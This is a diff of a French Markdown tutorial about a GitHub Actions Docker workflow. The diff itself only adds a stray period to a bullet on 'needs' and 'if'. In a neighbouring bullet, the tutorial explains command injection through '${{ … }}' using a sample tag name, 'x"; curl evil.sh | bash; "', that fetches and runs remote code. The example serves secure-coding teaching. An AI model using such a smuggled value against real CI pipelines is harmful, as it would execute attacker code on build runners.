@@ -326,7 +326,7 @@ Dans le projet **`tasks-api`**, ouvrez `.github/workflows/docker.yml` et ajoutez
   Vérifiez-le : GitHub → votre profil → *Packages* → `tasks-api` : les versions listées n'ont pas de `v`.
 - **Pourquoi `VERSION` passe par `env` et jamais par `${{ … }}` dans la commande.** Avant même de lancer la commande, GitHub **remplace** `${{ … }}` par sa valeur, comme un copier-coller dans le script. Si cette valeur contient des caractères spéciaux (un nom de branche ou de tag piégé, par exemple `x"; curl evil.sh | bash; "`), ils sont alors **exécutés comme des commandes** : c'est une *injection de commande*. Avec `env`, la valeur arrive dans une variable, traitée comme du simple texte, jamais comme du code.
 - **`token:` dans le 2ᵉ checkout.** C'est ce jeton qui donne le droit d'écrire dans `tasks-config` (voir l'encadré de l'étape 1). Le `git push` de la dernière étape réutilise automatiquement ce droit.
-- **`needs` + `if`.** Le job attend `deploy-production` (donc votre approbation manuelle) et ne tourne que sur un tag, jamais sur un simple commit.
+- **`needs` + `if`.** Le job attend `deploy-production` (donc votre approbation manuelle) et ne tourne que sur un tag, jamais sur un simple commit..
 
 > ✅ **Point de contrôle :** aucun `___` ne reste dans le fichier, l'indentation est identique à celle des autres jobs, et GitHub n'affiche pas d'erreur de syntaxe rouge sur le fichier.
 
